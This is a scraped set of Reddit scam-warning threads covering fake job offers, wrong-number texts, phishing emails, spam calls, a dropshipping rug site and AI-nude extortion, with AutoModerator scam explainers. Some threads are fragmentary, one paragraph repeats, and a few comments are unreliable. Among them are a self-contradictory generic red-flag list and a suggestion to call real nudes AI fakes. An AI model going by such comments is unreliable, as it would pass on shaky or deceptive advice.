- I applied for two jobs from this company and also got texts messages. The email also says to reach out to a totally different company. It‚Äôs a scam.
- I literally just did the same thing. From a glance it looked promising but my discernment told me to pray about it and research the company. I‚Äôm glad I found this post because I just got the same email smh. Got to use sense in this world because some people are willing to do whatever outside of integrity to scam people. I would advise to you all to report this to indeed as well.
- Yeah I was thinking the same but it‚Äôs my first time actually coming across a job scam. What triggered the flag for me was the fact they wanted me to got to some 3rd party messaging app for the interview, the dodgy grammar in the email and the fact that they put ‚Äúinterview time: immediately‚Äù
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- The amount of work these people put into scamming people is nuts‚Ä¶.. if they put the same amount of effort into a normal job they‚Äôd be making good money‚Ä¶..
- That‚Äôs why I posted the entire email to make it easier for people to find this üòÇ
- You're already getting a check? Make sure not to send money back
- I sent in the w-4 forms and everything also with my social and ID ü§¶üèæ‚Äç‚ôÄÔ∏è I once knew it was a scam once they redirected the check from coming in the mail to having me print it out instead ü§¶üèæ‚Äç‚ôÄÔ∏è
- But what if it is real
- Should I withdraw it then pay it back to the bank if it bounces
- It's not going to bounce right away. It will bounce after you send them back some money
- How can I tell if I‚Äôm buying the product from a legitimate site. Or should I say I will buy everything. I will show the message
- Lol please stop trolling
- I‚Äôm not I sent pictures read the conversation I‚Äôm serious
- Read this. It was just registered 2 months ago¬†https://www.reddit.com/r/Scams/comments/1i5pr9o/comment/m86m25e/

Title: Is there a known scam where people text you using your name to elicit a response?
Body: Got a text from a random number after midnight saying ‚Äúhey beautiful‚Äù. I responded in the morning asking who it was and they responded saying good morning [my name] and that they just wanted to say ‚Äúhave a good day and that you‚Äôre beautiful‚Äù I told them they have the wrong number, bc I was weirded out that they wouldn‚Äôt tell me their name. 

My relative told me I should not have responded at all and that my number and name was probably sold and that it‚Äôs a scam to confirm if my number is active and with the person they are hoping to reach. Is this a common thing? 

Never heard of it but it really weirded me out. Only thing that makes me think otherwise is that the initial message was after midnight last night and what they said.

- Do not respond to these. They are always scams. Delete, block, and ignore.
- Your relative is correct. It's a common !wrongnumber scam. They might text "Hi Effie, pizza at your place later?" or "I saw you Saturday night with your ex" or "I hate you". Anything to try to get a response from you. (You're lucky, you got a very pleasant text.)

Often, if you do respond, they say: oh, sorry I got the wrong number! You seem really nice!

Next they try to hook you into some scam to take your money. Maybe friendly chat for a few days, then tell you that they are rich, and they want to help you get rich.

Since you responded, you might get more scam messages. But most of us get lots of scam messages anyhow.
- it's often how pig butchering scams start
- Yeah but if you have a common name your info might not have been sold per se, they might have just gotten lucky.¬† I get them all the time but my name is uncommon so they use A name but never MY name lol
- Now you know to block and delete unknown texts and callers. Since you responded, brace yourself for more. They now know it‚Äôs a good number. Block and delete. They will stop.
- block and do mot respond to random texts. Dont answer the phone from unknown numbers. If it's important,  they will leave a message.
- Your first mistake was responding to a number you didn't know and saying who is this? That's like catnip to a scammer.
- It‚Äôs an opening to pig butchering or a romance scam.
- Yes. I heard of an elderly lady that was scammed out of thousands like this. They used a random name, it happened to be of her grand, and then they convinced her he was in jail and needed bail money.
- I just got a ‚Äúhow was your day today?‚Äù text from a number 2,000 miles away.  Will ignore like all the other random texts.
- Once you respond, your name shows up in their contacts‚Ä¶üôÑ
- If someone is not saved on your phone as a contact they better text, identify who they are and what they want from me.   If they dont do all those 3 things they get ignored and/or blocked.

Im not missing out on anything, they are counting on you feeling like you‚Äôre missing out on something., i.e. lonely.   You‚Äôre not.
- So weird in this time period (2015 on perhaps?) to respond anything. ‚ÄúWho is this?‚Äù Who cares, delete, block, or just ignore.
- This sounds like a scam. 

Your relative is probably right‚Äîthey just want to see if your number is active. Once you reply, they might try more tricks.

It‚Äôs best to ignore messages like this in the future.
- One evening I received a text saying something like Hello beautiful. I ignored it knowing it had to be a scam or wrong number. Turns out it was a friend I had lost touch with & didn't have their number in my new phone.
- I responded to one where they addressed another person and went into so some detail about friend stuff so I responded.  

‚ÄúSorry you have the wrong number.‚Äù

Then they pull the: ‚ÄúOk thanks!  You seem like a really good person!  What are you up to?  How are you?‚Äù

I rolled my eyes and responded:

‚ÄúI‚Äôm a married, asexual, old, broke, bald, fat guy, and I shit 7 times a day.  I‚Äôm currently shitting and looking at the bath tub, go away.‚Äù

Almost none of that is true, but you gotta make them feel like their time isn‚Äôt worth it if you fall for responding.
- Noted, I only ever get job interview scams so this was new to me. And I was only inclined to respond since I have relatives from the same state. I definitely will not respond again
- Omg I‚Äôm so glad I posted this I had no idea there were scams like this going on. I thought it really had the potential to be someone I may have lost contact with or a relative, that was the only reason I responded . 

I‚Äôll admit I got curious and downloaded the free phone number apps and called them. They didn‚Äôt pick up and texted the fake number saying thanks for the call and if I could text them. But that‚Äôs all I did, I‚Äôve already blocked them from my real number
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Wrong number scam.

An intentional wrong number text is the entry point to multiple different types of scams. Because these are so prevalent and lead to several unwelcome outcomes (including you confirming you have a live number, leading to more spam/scams), it is recommended that you do not reply to them, even out of courtesy. They hope to take your courtesy, parlay it into a conversation (often by commenting how nice you are and giving some suggestion of fate in meeting this way), and eventually deploy a scam.

If you received a wrong number inquiry that seems to assume a connection with you (e.g. seeking a specific friend, inquiring about a doctor‚Äôs appointment, asking about a business correspondence, etc.) and there are no pictures included, then you are likely at the beginning of a crypto scam. Use ! crypto without the space to get more info on crypto scams. You can see a video of this scam develop from wrong number to crypto scam at https://www.youtube.com/watch?v=CZ_flb9tGuc

If you receive a random text from a woman that is trying to play up a relationship/hook-up angle and includes an alluring photo, you have encountered what this subreddit often calls the Mandy scam, based on the name used in an early incarnation of it. The replies are sent by a bot and will give the same responses (with some slight variations) regardless of how you respond. The bot also has a few specialized responses that occur when you say words like 'bot' or 'scam'. After a series of replies, it will eventually push you to go to an adult/cam/age verification site. Here are some of the posts on r/scams about the Mandy scam: https://www.reddit.com/r/Scams/search?q=mandy&restrict_sr=on&include_over_18=on&sort=relevance&t=all, you can see that the images, names, and scenarios vary. You can report spam texts by forwarding them to 7726 (SPAM): https://www.consumer.ftc.gov/articles/how-recognize-and-report-spam-text-messages

There is also some evidence that intentional wrong number texts can be part of a data-gathering exercise where each bit of info you give (e.g 'Hi Susan!' and you reply with your name out of courtesy) is collected to be used against you in other scams. Thanks to redditor teratical for this script.


**
- The name alone will deter me from answering any unknown number ever again lol.
- True, I should‚Äôve listened to my gut bc I felt weird just responding
- lol lucky for me, I haven‚Äôt dated in years and I‚Äôve have no interest and trust issues üòÇ even if it was a real person I knew, they‚Äôd be wasting their time 

Also thank you for the info!
- I have that setting turned off, I do my best to protect my information the best ways I know how to. I‚Äôve never been a fan of that contact sharing mess
- Yea, I thought it would be something like that too, but it was an immediate red flag when I asked who it was and they ignored so I dismissed them with wrong number
- That‚Äôs the wrong number scam that moves to crypto bs.
- Someone who can afford a bath tub (even if it‚Äôs only for looking at) may be worth scamming‚Ä¶
- You sound like my kind of guy!
- Pig butchering scam if I'm not mistaken
- Yeah- it‚Äôs just an entry way to figure out if it‚Äôs a ‚Äúlive‚Äù number- with a person (you) that can potentially be scammed. It‚Äôs intended to illicit a reply. 

They can make money by selling your number to other scammers now that they know you answer. So going forward if you get texts just block- report as junk and move on. 

Most of these scammers are in other time zones- so when it‚Äôs sent doesn‚Äôt really mean much.
- It‚Äôs a common post dozens of times per week. Really search or browse a sub before your first post there.
- Yep.  They of course tried to keep it going but I just stopped, and they stopped after a few more messages.
- I just wanted them to try to be like "Oh I love old, broke guys that are fat and bald and hate sex and shit too much.  Anyway, I made $500 in crypto last week after I only invested $50."

I didn't realize my bathtub was a sign of wealth! :P
- Do you know anything about crypto?  I've been looking to invest.  I'm sick of sitting on the $13,500 worth of Apple gift cards that I bought but I will never use.
- That makes a lot of sense thank you!

This is a very common scam that happens either on Steam or Discord, or both.

You receive a message from someone claiming that they accidentally reported you, and they will direct you to the profile of a scammer that impersonates a Steam or Discord employee or admin. The other account will then either try to steal your Steam or Discord account. If you encounter this scam, ignore the scammers and report their accounts, including the one that says they accidentally reported you.

The other account will then either try to steal your Steam or Discord account. If you encounter this scam, ignore the scammers and report their accounts, including the one that says they accidentally reported you.

Title: Mom almost got scammed by a fake email from Marcus by Goldman Sachs
Body: You can see the email on here: [https://imgur.com/a/n8YmO0A](https://imgur.com/a/n8YmO0A)

Basically it's an email that looks like it came from Marcus by Goldman Sachs, but it says it is coming from bostondiamond.com??? Then if you hover over the link, it's to some weird place.

- Did you tell your mother what to do NEXT time?
- I just told her not to click on anything in emails now. This was almost legit looking until I hovered over links.
- You did not even need to hover over links.  The email came from a domain representing itself as bostondiamond(.)com.  That domain has nothing whatsoever to do with Marcus.  There was no reason to even read another single letter beyond that point.

Title: Is this job a scam or is it legit ?
Body: Hi Reddit,

I‚Äôve been job hunting for a while now and recently came across a job posting on Facebook for a work-from-home position. The ad asked me to contact recruitment@lazard-inc.online, and the job seemed like a perfect fit.

However, something about the process feels off to me. For context, I‚Äôve been applying to countless jobs over the last year, so I‚Äôm pretty familiar with how recruitment works‚Äîbut this one is giving me mixed signals.

Here‚Äôs what‚Äôs raising red flags:
	‚Ä¢	The company appears legit (publicly traded, has a website, etc.), but the recruiter directed me to fill out a form on SurveyHeart (https://surveyheart.com/form/678d453e22a9932312766d78).
	‚Ä¢	After completing the form, I noticed that I could see other people‚Äôs responses, which felt unprofessional.
	‚Ä¢	Despite their legitimacy on paper, the entire process just seems‚Ä¶ off.

Has anyone encountered anything similar, or does this sound like a scam to you? Any advice or insights would be greatly appreciated!

Thanks in advance to anyone who takes the time to help.

You are dealing with an impersonator.
- $27 an hour for remote data entry. 

And

Kindly. 

Scam.
- Look at all the terrrible photoshop on that latter (dates, salary, company name, company hr email‚Ä¶)
- stopped reading at "data entry". It is going to be a scam.
- Asking you to keep wages/starting salary confidential could likely land a company in lawsuit territory. Among other flags. And of course, they couldn‚Äôt help themselves to refrain from using the word, kindly. They almost got thru the entire letter without using it. It must be ingrained. So close! You‚Äôd think by now they‚Äôd catch on with that dang word.
- Lazard is an established company.  Their website is lazard (dot) com, which you can easily find if you Google the name of the company. On their website, they have job postings.

If you didnt give thesr scammers any financial info such as your credit card number, you should be OK.

Your address, phone number, relatives, people who live with you, email addresses, past addresses are all publicly available. If you do a Google search with your name or phone number, it will return multiple sites like Spokeo and Radaris that have your address, former addresses, people who live with you.

Title: PSA: All phone calls are scams or spam unless proven otherwise
Body: Anyone sub‚Äôd here already knows this, but thought I‚Äôd present an image demonstrating the volume of spam/scam calls for funsies. I pay for a call filter ‚Äî highly recommend! In the past 60 days I received 165 phone calls. 3 were legit (from Grandma, everyone else texts), 141 were blocked by the call filter, and an additional 21 made it through and I manually reported as a scam based on the voicemail they left. 

So yeah, all the folks who post here asking if a phone call they received is a scam ‚Äî yes, yes it is. No other details needed. Stop answering your phone for unknown numbers. My voicemail message states ‚Äúdue to an excess of junk calls, I no longer answer my phone. If you have legitimate business with me, find a way to send me a text or an email.‚Äù 

(In the photo, the giant bubble on Jan 17 represents 12 spam calls received that day alone, and not a single one rang through to my phone).

- The problem is biggest for people whose work depends on getting phone calls from unknown prospective clients. They should of course still get a filter, but I can see why they might answer a call. But within three words it's clear when the caller isn't a client, at which point you hang up and block.
- I wish more people would understand this.

I had two real phone calls in the last year, one from my wife and one from my dad, both time-critical emergencies.

Everything else was a text.
- Hello there, which service do you pay for? I am searching for a good service, since i get more and more spam calls lately.
- It‚Äôs almost sad that nobody actually TALKS to each other anymore.

It reminds me of the woman from Hawai‚Äôi who went missing for awhile.  Her family was texting with her just before she vanished, and they felt that some of the texts didn‚Äôt seem like her at all.

Well turns out they probably _were_ from her, and she unvanished after awhile and was ok.

But that‚Äôs not the point.

If they had just CALLED her, and if she had actually answered of course, they would‚Äôve known _right away_ that she had her phone and that it wasn‚Äôt someone pretending to be her.

It‚Äôs happened with others who really did go missing and were never seen again‚Ä¶

Just call maybe and you can find out really fast if the person you care about is ok and still has their phone?

Just a thought‚Ä¶

Still agreed with not answering unknown calls, of course; I _never_ do, and my vm greeting is Siri in an Australian accent - no name is mentioned and it just states to leave a msg, no disconnected msg or tone or anything though, just not my actual voice or name.

Anyway, you just got me thinking about how EASY it is to impersonate someone in a txt msg, heh.

One other thing:

How much have you put your number out there??  I get almost no scam calls - maybe one once a month or every couple of months.

I‚Äôve had my cell number since I was a kid, and nobody else has ever had the number (cell phone use was growing rapidly back then and new area codes were being created for the increased volume of numbers, so mine was a brand new number and area code at the time - not sure if that has anything to do with it, though).

Just wondering why you get so very many‚Ä¶  Do you respond to unknown texts a lot?  Sincerely curious!
- I keep Silence Unknown Callers on. Fairly often, I need to turn it off because I'm expecting a call that will come from an unknown number. It's usually something I'd prefer not to have to deal with, getting bids on home maintenance, healthcare shit, etc., getting junk calls around dealing with whatever makes it extra annoying. We moved a few times after Covid, for me it's mostly real estate cold-calls about selling a house I no longer own.
- People say this alllll the time on this sub. It‚Äôs super unrealistic for the average person; there are tons and tons of reasons someone may have to answer calls from unknown numbers for work or otherwise
- I never answer the phone, and now I get almost no scam calls.
- I forward all unknown numbers to voicemail by default. People that actually need me will leave a voicemail or text. 

99% of unknown number calls are spam or scams.
- I'm blown away by how many scam calls people get.  I have 2 phones - my personal and work phone - I would get 1 scam scall each on them a year.  When we had a landline that would be the same.
- Yeah I do get a few wrong numbers on my work phone for some Asian guy.  Plus a few texts reminding me to book dentist appointments!
- When it comes to phone calls, you should have a whitelist instead of a blacklist.
- I have my phone set to silence any number that's not in my contacts. The only time I answer an unknown call is when I'm expecting it ("let me look into it and I'll call you back in 20 minutes" sort of thing) or when I'm waiting on an Uber/Lyft and get a call from a weird number, since it's always the driver.

I guess I can't silence texts (?), but then those have the advantage of not requiring immediate action--I can look at it and think, do I know these people, this situation? And I can go online and look up whatever it is, if I'm not sure. Just today, I got a message saying I owe $6.99 on a toll service in Massachusetts, which is interesting because I've never been there. :-D But then of course, that necessitates another PSA: any "odd" message (money owed, a company you don't remember dealing with, a problem with your account, and so on), always look into it *outside* of the method they've used in their communication. Don't reply to the text, don't click the link, don't call the number. Go to another source (eg, the web) and look into it there.
- How do I sign up? Which app is that
- I wish iphones had a feature to straight up block any callers not in your contacts. I think you can put it on dnd and do allow only contacts but that‚Äôs a whole unnecessary thing.
- Ah yeah. I meant to state that this is for personal phone. I can‚Äôt say I have advice for businesses.
- One can still use their brain when answering calls, but it seems like once the phone is at the ear, critical thinking gets shut off, and everything the other person says is 100% true.
- I have a friend in that situation. He works at home and has to answer his phone no matter who calls.  He says he has gotten a couple of scam calls, but not many and not for a long time.  The reason is that he works for a government law enforcement agency and he announces his title and agency when he answers.  Early on he said he had a couple of strange calls, but the person quickly hung up.  After that zero scam calls!

In contrast, he still gets tons of scam calls on his personal number like everyone else.
- Yup, the calls from Grandma were because Grandpa died. Otherwise, she lives down the street and I just visit with her in person.
- Verizon. I think it‚Äôs $5/mo? I‚Äôve been using it for just over a year, and it‚Äôs not perfect but it obviously catches the majority of junk, and I am SO much less aggravated on a daily basis. Easily the best thing I‚Äôve done for my emotional health this past year. I know some folks like to mess with the scammers, but honestly the best thing we can all do is just stop answering the phone for them, period.
- I don't understand the need for a service. I just turned on the "Do not disturb" function on my phone to block all calls except from selected contacts. If you get a legit call from someone you don't know they will leave a voicemail. Problem solved.
- i agree with mostly everything you said. i have also had my same phone number since i was very young. Id say I get a few scam calls a month. BUT, my social security number has been leaked multiple times due to colleges, past jobs, applications etc. sometimes data leaks just can‚Äôt be prevented and aren‚Äôt your fault necessarily‚Ä¶ i wonder how much the ‚Äúdark web‚Äù knows about me :(
- I tried implementing a ‚Äúno texts‚Äù rule with my closest people a few years ago, because I want real conversations. Dad, who I had a good relationship with but hates talking on the phone, replied that we just wont talk anymore then. The rule didnt last more than a week, but I did leave social media because I loathe passive observing. 

I do talk to my mom on the phone as she lives 400 miles away. We text good morning but otherwise I call her in the evening (which is why she is not included in the incoming calls in my call filter stats). Anyone else close to me that we usually text, are people I usually see in person regularly enough. We also have our secret passcodes from shared lived experiences in case something feels awry. Found out my best friend‚Äôs then-fianc√© stole his phone this way. 

As for why I get so many scam calls‚Äîyeahhhh. A multitude of reasons. First, I get at least two letters a year that my data was involved in a data breach, some really big ones. I have permanent free credit monitoring. I also own a couple bits of property, and apparently that gets your info sold out to everyone. Voter registration info is public, so I get quite few political calls. As an aside, the lack of privacy for voter information is jarring. All you need is a phone number and you can get a person‚Äôs home address, name, and family members to start you into a rabbit hole. 

I do not reply to junk texts, not even to say STOP. I use the report as junk button 100% of the time to delete and block. Sadly the call filter doesn‚Äôt catch spam texts.
- This is just for my personal cell phone. I don‚Äôt receive work calls on my personal device, and my work phone doesn‚Äôt receive unknown calls, so I have no advice for folks who have this situation, other than to assume all calls are a scam unless proven otherwise. There are zero people who call me with a legitimate reason who have an unknown number. Even if I don‚Äôt have them in my contact list, they still show up in Caller ID with their business or personal name. Most businesses I engage with these days prefer text anyway. My plumber, my mechanic, carpet shampooer, and my HVAC shops all just text. ü§∑‚Äç‚ôÄÔ∏è
- I think it depends on your number and whether someone had it before you. I‚Äôve had my number for 20+ years and only get like 1 spam call per week. But a couple years ago my work gave me a phone with a separate number and I get something like 20 spam calls per day on that phone. I assume the old man who apparently had it before me (based on spam texts I get there) is somehow on all kinds of spam lists. Somehow my personal number is not, despite giving it out on endless web forms and to many organizations over decades.

I don‚Äôt know what I did right, or what that guy did wrong. But I just leave my work phone permanently on silent and have people call my personal phone instead.
- The scam calls on my phone have calmed down from one a week to almost nothing. But I had to unplug my landline as scammers called in the night.
- I get maybe 1 or 2 a week.
- Yeah, my volume is pretty nuts. My work phone I get maybe 1 per year. I read somewhere recently that the average is 6 per month. Me sitting over here with 12 per day ü§£‚ò†Ô∏èü§£‚ò†Ô∏è
- Verizon for me. If you have a different service provider they might have their own. There are probably others that are standalone, but I prefer the simplicity of fewer bills to have to track.
- Is this rage bait? [Turn on Silence Unknown Callers](https://support.apple.com/en-us/111106)
- Honestly, the call filter should just be a standard free service from all cell service providers. Still allowing the calls to come in, but silenced, is still annoying because the phone still illuminates and they can still leave a voicemail.
- Use a google voice number whenever you have to use a phone number with a company or deliveries.




Only my actual contacts ever get my real phone number.
- [removed]
- I‚Äôm not sure which credit monitoring service I have, but it includes scans of the dark web for my info. I know I have one email address of about 7 that is compromised on the dark web. I still keep it as my junk email but it is basically sandboxed from all other connections. So yeah, I‚Äôd recommend a credit monitoring service, even if just for a month, to have them run a scan for you if you‚Äôre really curious.
- Thanks very much for taking the time to reply with your sincere insights - it‚Äôs truly appreciated!

For the record I own multiple properties as well, so I‚Äôm not sure if that‚Äôs the issue, but agreed regarding voter registration - it SHOULD be private, imo!

And good for you with at least trying the no texts rule.  I really wasn‚Äôt even saying never text though, just that especially if you‚Äôre concerned about someone, it might be a good idea to call rather than to only keep texting them.  And maybe periodically agree to talk on the phone every once in awhile, just to reassure each other that you‚Äôre each still really there‚Ä¶

I do _not_ get letters each year about data privacy breaches though at least one of my email addresses is definitely on the dark web and was in multiple data breaches starting over a decade ago (NEVER actually broken into, though).

For the record, I think what saved me there is I _NEVER_ entered my name on that email address - just one letter for each field (my first initials or not??  Hmmm. üòâ).

Over the years I‚Äôve gotten some quirky responses from friends/family regarding email from that address coming just from ‚Äúinitials person,‚Äù but in hindsight, I think it was a ***VERY*** smart move on my part.  I guess I‚Äôve been a little ‚Äútoo‚Äù paranoid most of my life‚Ä¶

Thanks again for your response, and also thank you for this post - I truly hope it helps some people out there!

Take care and good luck to you! üôÇ
- Oh yeah the US. Can't find anything like this in Australia. There is no call register which I am already sign up to. When using Google pixel, Google was great in spam detection. It will mute the call and show a big red screen. Apple on the other hand has nothing built in or at least it's pretty shit that I constantly get calls. 

Tax scams

Bank scams 

Amazon or PayPal scams etc
- I have this activated and I still receive calls from unfamiliar numbers, so not exactly fitting the bill
- I‚Äôm laughing at myself for this lol. I have heard of people doing this and for some reason never employed it myself. I‚Äôm probably on so many call lists at this point that it will never end for my real number, but I‚Äôm going to get this setup tonight. Thanks!

Title: Possible new scam? https://shorturl.at/hvc0p?GlE=Jd8ri7aMFG
Body: I received a text on the 16th December 2024 which said:

"Due to quality problems with the product, the merchant wants to recall the items in your order and compensate you."

This was followed by the address which have posted in the title. I only spotted the text today when the sender of the text left the group. Im not sure who this is from and its not from any of my contacts. For obvious reasons I didn't click the link. The person who sent it had made a group with just me and them - the group title was my full name. (That could be nothing but I just thought it was a bit weird!)

I was just wondering if this is a scam?

Sounds awfully generic. And thus fishy.

I'm going with SCAM.
- "Due to quality problems with the product, the merchant wants to recall the items in your order and compensate you."

I would ask why the merchant isn't emailing me, any time I order something everything is done by email and I have a history.  Why would one of my merchants send a text for anything but a shipping update?

Title: rugsrat.com, are they legit?
Body: Hello!

So I ordered a rug from this website on 8/9th December and received a tracking number through email. Nothing for a few weeks, then it finally dispatched on 20th December, through the tracking website I was able to see that they had received the parcel information. I hear nothing for weeks, and after 20 days in transit and no update to the tracking website, I decide to message their instagram. 

After 3 days of messaging them, I finally get a response to say they will request information from their carrier. 4-5 days later I have to message them again for an update to which they say my parcel may be lost they‚Äôre waiting for the carrier to confirm. 

Another 4 days later, after no response, I message again and they tell me the parcel is lost and they‚Äôll resend a new one. To this I ask for some kind of email confirmation to prove that they will do this and they say I‚Äôll receive tracking when it‚Äôs been shipped. That was 4 days ago and I have been messaging them asking for an update to which I‚Äôve gotten no response. 

I paid almost ¬£70 for this rug and the international shipping so I‚Äôm feeling slightly frustrated and scared I‚Äôve been scammed.

Please can anyone advise anything or have you experienced something similar?? I need help!!

- https://www.whois.com/whois/rugsrat.com

Domain is less than a year old, only registered for a single year, and is registered out of Iceland.  All three of those are red flags.

This is almost certainly a dropshipper:  Someone who sets up a shell website to take orders for items that actually exist on AliExpress for a fraction of the price.  You place the order, they take your money and place the _real_ order on AliExpress with your address as the shipping destination.  You end up getting cheap Chinese junk with slow overseas shipping, and the dropshipper gets money for doing essentially no work and not even providing bare minimum customer support.  They just want to keep you placated long enough for the window for you to file a chargeback to expire.
- thanks everyone for your help, I appreciate it!
- The website ‚Äòrugsrat.com‚Äô appears to be a scam. Here are the reasons:

1. Lack of Credible Information: The website lacks detailed information about the company, its location, and its history. Legitimate businesses usually provide this information to build trust with customers.

2. Unrealistic Discounts: The website advertises discounts of up to 50% off, which can be a common tactic used by scam websites to lure in unsuspecting customers.

3. Limited Payment Options: The website may only offer limited payment options, such as credit cards or online payment platforms. Legitimate e-commerce sites typically offer a variety of secure payment methods.

4. Lack of Customer Reviews: While the website claims to have many satisfied customers, the absence of independent customer reviews on third-party platforms is a red flag.

5. Suspicious Domain Age: The domain age of 9 months and 4 days is relatively young for an e-commerce site, especially one claiming to have a large customer base.

6. Limited Contact Information: The website may have limited or vague contact information, making it difficult for customers to reach out for support or inquiries.

7. Unusual Product Range: The website‚Äôs focus on custom rugs with specific themes (comics, gaming, etc.) can be a tactic to appeal to niche interests, but it‚Äôs also a common strategy for scam sites to appear unique.

8. Lack of Trust Seals: Legitimate e-commerce websites often display trust seals from recognized security and verification services. The absence of such seals can be a warning sign.

9. Poor Website Design: While this is subjective, a poorly designed or unprofessional-looking website can be a sign of a scam, as legitimate businesses usually invest in a professional web presence.

10. High Number of Sales and Positive Reviews: If the website claims to have a high number of sales and overwhelmingly positive reviews, especially without verifiable sources, it could be a tactic to create a false sense of popularity and trust.

It‚Äôs important to exercise caution when dealing with unfamiliar online stores, especially if the above red flags are present. Always research the company, look for independent reviews, and consider using secure payment methods or platforms that offer buyer protection.

Title: AI nude photos scam???? Help

- keep blocking and ignoring. Be a black hole for messages. Don't reply in any way.

There are two possibilities:

1. They want money. If they think they won't get money, they'll move along.

2. They're someone you know personally punking you. When you aren't entertaining, they'll move along.
- Also, change your profile picture on iMessage to a cartoon/anime or famous dead person and change your privacy settings on Facebook so only people that you've friended can contact you so that you don't accidentally get suckered again.
- They won't do anything with them. They'll just keep hounding you for money until you give in. Keep reporting their facebook and numbers and blocking them. Do not respond.
- Why would you be anxious or worried? You said yourself that they're AI generated/photoshopped/not real.

Look, people come here all the time who have actually very literally sent people nudes, and we commonly tell them to just say they're AI fakes.

If your starting point is that they're actually AI/photoshopped fakes, why would it be of concern?

You could put out a message that someone is trying to blackmail you with faked nudes or whatever, but the more you're stressed about it, the more power you give them over something that should have none at all.
- NEVER answer those type of texts. If it's someone you know, they should say something once they realize you didn't recognize their number. Other than that, just ignore this person. They'll get bored and move on to another victim. 

What's more concerning is that it might be someone you know, because of the Facebook thing. Check your FB friend list. Is there someone who would be interested in blackmailing or humilliating you? Perhaps an ex-partner, or a partner's ex?
- [removed]
- It's¬† F A K E video... who cares?¬† Literally anyone can download an app to make that.¬†¬†


Tell your friends and family that you got threatened and not to open what are likely virus laden videos.¬† ¬†¬†


Sending money will only let them know you're scared and have money, they will continue to extort you, they will not stop.


Your generation needs to stop panicking about nudes.¬† Your parents have seen your dick already, its nothing new.¬† It's not the end of the world.¬† Y'all send them out freely enough and with the proliferation of AI editing making it next to no effort to make a picture into a dirty video, it's just not an issue to worry about.
- Keep blocking. Nudes are fake anyway.
- And this is why you don‚Äôt answer in the first place - it‚Äôs a ransom scam.
- Simply block, never reply, and move on
They won't do jackshit
- Thank you very much for your reply. I will continue to block and delete. It gives me so much anxiety and makes me feel so gross
- Good call. I will remove my face from my profile photo
- Thank you. That‚Äôs what I will continue doing
- Hey! Yeah i totally get your point. I worry about myself professionally if it was ever sent to my work because yes, they aren‚Äôt not photos of me, but they‚Äôre still naked photos with my face on it. Its just fucked up
- That‚Äôs what scared me the most. The fact they know my last name, city and can see my profile picture. The person who messaged me on Facebook was very clearly a fake profile and I reported it and it got taken down. I truly can‚Äôt think of anyone who would do something like that to me
- That is hilarious üòÇ do they keep trying to contact you after with different numbers though?

- I should mention anyone messaging you that "knows a hacker" or can track them, etc., is a !recovery scam.
- You have a lot of company. They just blast this stuff out. They‚Äôll quickly move on.
- Give them nothing OP. Any signs of you taking the bait will escalate things. Just keep ignoring & blocking. They‚Äôll eventually get bored or realise you‚Äôre not going to become a blackmail victim and will move on to the next. As soon as you show any vulnerability, they‚Äôll come at you with more determination. Never ever liaise with these dirtbags. Enjoy your life and ignore any communications..
- Which is exactly what the scammers are relying on.

And, I've said this before, but I'm gonna double down; this cat is out of the bag. It's not going to happen overnight, but the sooner that we, as a collective, as a global society, just accept that people are naked, and sometimes they send pics (or video) of themselves naked, the sooner this scam loses all of its power.

Yeah, I get it, it's easy to say when I'm not the one being sextorted with real or imagined material, but it's something to keep in mind in the future. If someone else ever gets exposed, real or fake, just shrug it off, ignore it, support them but internalize that nobody needs to give a shit.

Shame and embarrassment are the key tools used to make this an effective scam. Whether it's embracing sex positivity or positive body imagery or whatever the hell it might be, let's just all agree that it's not worth sweating, and in turn, it becomes less worth sweating.

But that's a far flung future thing, and you're dealing with this bullshit in the here and now.

So... accurately calling it an AI fake is the play, and hopefully ignoring and blocking them leads to them seeking more pliable prey.
- That's very scary. Is there a way they could have figured your last name without them knowing you? I never had an iPhone so I'm not familiar with iOS. But seriously, based on these details I'm more inclined to think it's not a stranger.

- Hi /u/Ok-Lingonberry-8261, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

Title: Is my meeting with MEPS a scam?
